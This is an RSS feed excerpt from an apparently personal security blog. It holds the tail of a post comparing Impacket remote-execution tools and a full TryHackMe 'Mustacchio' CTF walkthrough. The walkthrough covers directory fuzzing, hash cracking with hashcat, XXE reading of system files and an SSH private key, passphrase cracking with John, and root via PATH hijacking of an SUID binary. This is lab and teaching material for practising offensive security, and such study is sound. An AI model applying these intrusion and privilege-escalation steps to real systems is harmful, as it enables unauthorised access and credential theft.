&lt;p&gt;This program uses the &lt;a href=&#34;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0&#34;&gt;Distributed Component Object Model (DCOM)&lt;/a&gt; protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained &lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;here&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Dcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its &lt;code&gt;ExecuteShellCommand&lt;/code&gt; method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;tldr&#34;&gt;TLDR;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;PsExec works over SMB by uploading a &lt;code&gt;.exe&lt;/code&gt; file that creates a named pipe between you and the remote host&lt;/li&gt;
&lt;li&gt;SmbExec works similarly, except instead of a &lt;code&gt;.exe&lt;/code&gt; file, it uses a &lt;code&gt;.bin&lt;/code&gt; file.&lt;/li&gt;
&lt;li&gt;WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB.&lt;/li&gt;
&lt;li&gt;AtExec works through executing scheduled tasks in SMB&lt;/li&gt;
&lt;li&gt;DcomExec uses the DCOM protocol with RPC to execute commands&lt;/li&gt;
&lt;li&gt;They all look different in logs&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I hope you learned something because I certainly did.&lt;/p&gt;
&lt;h1 id=&#34;references&#34;&gt;&lt;strong&gt;References&lt;/strong&gt;&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Attacking Windows: Performing Lateral Movement with Impacket&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.trustedsec.com/blog/no_psexec_needed/&#34;&gt;https://www.trustedsec.com/blog/no_psexec_needed/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec#manual-smbexec&#34;&gt;https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&#34;&gt;https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&#34;&gt;https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;other-exec-tools-that-you-can-learn-moreabout&#34;&gt;Other “exec” tools that you can learn more about&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/skorov/scexec&#34;&gt;ScExec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec&#34;&gt;MsiExec&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Mustacchio Walkthrough | Try Hack Me | Ally Petitt</title>
      <link>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</link>
      <pubDate>Fri, 18 Feb 2022 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2022-02-18_mustacchio-walkthrough---try-hack-me---ally-petitt-6295dfbbfb1b/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*F19asfqgh7o-jFDVwsTizA.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!&lt;/p&gt;
&lt;p&gt;Notes: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;enumeration&#34;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;To begin, I scanned for open ports using &lt;a href=&#34;https://github.com/RustScan/RustScan&#34;&gt;RustScan&lt;/a&gt;. RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;PORT STATE SERVICE REASON VERSION   22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)   80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))   | http-robots.txt: 1 disallowed entry    |_/   | http-methods:    |_ Supported Methods: GET HEAD POST OPTIONS   |_http-server-header: Apache/2.4.18 (Ubuntu)   |_http-title: Mustacchio | Home   8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)   |_http-server-header: nginx/1.10.3 (Ubuntu)   |_http-title: Mustacchio | Login   | http-methods:    |_ Supported Methods: GET HEAD POST   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using &lt;a href=&#34;https://github.com/ffuf/ffuf&#34;&gt;FFUF&lt;/a&gt; (you can also use Wfuzz, Gobuster, or DirBuster for this part).&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ffuf -u &amp;lt;http://10.10.93.193/FUZZ&amp;gt; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png&#34; alt=&#34;&#34;  /&gt;

The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let’s investigate.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png&#34; alt=&#34;&#34;  /&gt;

And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings users.bak    SQLite format 3   tableusersusers   CREATE TABLE users(username text NOT NULL, password text NOT NULL)   ]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I’d like to explore the other web server running on port 8765.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png&#34; alt=&#34;&#34;  /&gt;

How great is this! We found the admin panel where we can log in as admin. Let’s see if we can get the admin credentials using the users.bak file.&lt;/p&gt;
&lt;h1 id=&#34;exploitation&#34;&gt;Exploitation&lt;/h1&gt;
&lt;p&gt;After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ sqlite3 users.bak   SQLite version 3.36.0 2021–06–18 18:36:39   Enter “.help” for usage hints.   sqlite&amp;gt; .tables   users   sqlite&amp;gt; .dump users   PRAGMA foreign_keys=OFF;   BEGIN TRANSACTION;   CREATE TABLE users(username text NOT NULL, password text NOT NULL);   INSERT INTO users VALUES(‘admin’,’1868e36a6d2b17d4c2745f1659433a54d4bc5f4b’);   COMMIT;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And there is the password hash that we found when we initially used the strings command on users.bak 😂. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ hashcat -m 100 ./hash /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png&#34; alt=&#34;&#34;  /&gt;

And we have our password! With the newfound credentials &lt;code&gt;admin:bulldog19&lt;/code&gt; I logged into the admin console on port 8765. Success! The credentials worked.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png&#34; alt=&#34;&#34;  /&gt;

While looking at the page source, two things immediately stand out to me.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I see a comment left by the developer&lt;/li&gt;
&lt;li&gt;The name of the input box is “xml”&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png&#34; alt=&#34;&#34;  /&gt;

When I try press submit without writing anything in the textarea, I am greeted by the following alert:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png&#34; alt=&#34;&#34;  /&gt;

Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the &lt;a href=&#34;https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870&#34;&gt;most common XML vulnerabilities&lt;/a&gt; is an XML Eternal Entity (XXE) injection, so let’s test for it in this application! I used the XXE payload from this &lt;a href=&#34;https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/&#34;&gt;blog post&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;`&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;When I type this in the text area and press “Submit”, I see the following on my screen:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png&#34; alt=&#34;&#34;  /&gt;

Success! This application is vulnerable to XXE injection. Let’s use this vulnerability to get our first flag.&lt;/p&gt;
&lt;h1 id=&#34;usertxt&#34;&gt;User.txt&lt;/h1&gt;
&lt;p&gt;Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his .ssh folder inside his home directory. I simply changed &lt;code&gt;/etc/passwd&lt;/code&gt; to &lt;code&gt;/home/barry/.ssh/id_rsa&lt;/code&gt; as &amp;ldquo;id_rsa&amp;rdquo; is a common name for the file containing a private ssh key.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png&#34; alt=&#34;&#34;  /&gt;

Success! We can now see Barry’s private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called “id_rsa_barry”, &lt;strong&gt;making sure that there is no white space&lt;/strong&gt;. I changed the permissions on the file using this command:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;chmod 400 id_rsa_barry&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;I went to ssh into the machine and this was my result:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png&#34; alt=&#34;&#34;  /&gt;

It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ python3 /usr/share/john/ssh2john.py id_rsa_barry &amp;gt; id_rsa_barry.hash    $ john — wordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png&#34; alt=&#34;&#34;  /&gt;

Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png&#34; alt=&#34;&#34;  /&gt;

Privilege Escalation&lt;/h1&gt;
&lt;p&gt;First, I took a look at Barry’s id.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ id   uid=1003(barry) gid=1003(barry) groups=1003(barry)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;It appears that he is not in any groups that we could use for privilege escalation. I also used &lt;code&gt;sudo -l&lt;/code&gt; to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;barry@mustacchio:~$ find / -perm -4000 2&amp;gt;/dev/null  
/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/snapd/snap-confine  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/bin/passwd  
/usr/bin/pkexec  
/usr/bin/chfn  
/usr/bin/newgrp  
/usr/bin/at  
/usr/bin/chsh  
/usr/bin/newgidmap  
/usr/bin/sudo  
/usr/bin/newuidmap  
/usr/bin/gpasswd  
**/home/joe/live\_log**  
/bin/ping  
/bin/ping6  
/bin/umount  
/bin/mount  
/bin/fusermount  
/bin/su
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Interesting, “live_log” is in Joe’s home directory. Maybe we have permission to execute it.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;barry@mustacchio:~$ cd /home/joe &amp;amp;&amp;amp; ls -la   total 28   drwxr-xr-x 2 joe joe 4096 Jun 12 2021 .   drwxr-xr-x 4 root root 4096 Jun 12 2021 ..   -rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;And we do! When I run it, it appears to launch an application.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png&#34; alt=&#34;&#34;  /&gt;

This isn’t very useful to us because we can’t interact with the application! Instead, I looked further into the file using the &lt;code&gt;strings&lt;/code&gt; command. Additionally, I used &lt;code&gt;awk&lt;/code&gt; so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strings live_log | awk ‘length($0) &amp;gt; 15’&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png&#34; alt=&#34;&#34;  /&gt;

Interesting. There is a path to “access.log” and the full path for the &lt;code&gt;tail&lt;/code&gt; command isn’t used. Maybe we can change the PATH variable so that we can use our own “tail” command that gives us root.&lt;/p&gt;
&lt;p&gt;`$ export PATH=/tmp&lt;br&gt;
$ cd /tmp&lt;br&gt;
$ echo “/bin/bash -p” &amp;gt; tail&lt;br&gt;
$ /bin/chmod +x tail&lt;br&gt;
$ /home/joe/live_log&lt;/p&gt;
&lt;h1 id=&#34;usrbinwhoami&#34;&gt;/usr/bin/whoami&lt;/h1&gt;
&lt;p&gt;root&lt;/p&gt;
&lt;h1 id=&#34;bincat-rootroottxt&#34;&gt;/bin/cat /root/root.txt&lt;/h1&gt;
&lt;p&gt;[REDACTED]`&lt;/p&gt;
&lt;p&gt;And it works! Since “live_log” was an SUID binary, we were able to run it as root. We were able to redirect the path from &lt;code&gt;/usr/bin/tail&lt;/code&gt; to &lt;code&gt;/tmp/tail&lt;/code&gt; which allowed us to run &lt;code&gt;/bin/bash&lt;/code&gt; as root, giving us a root shell.&lt;/p&gt;
&lt;p&gt;That’s all! I hope you enjoyed my explanations. Please send me any constructive feedback &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt-5a02aa208/&#34;&gt;via LinkedIn&lt;/a&gt;. Thank you and take care!&lt;/p&gt;
</description>
    </item>
  </channel>
</rss>
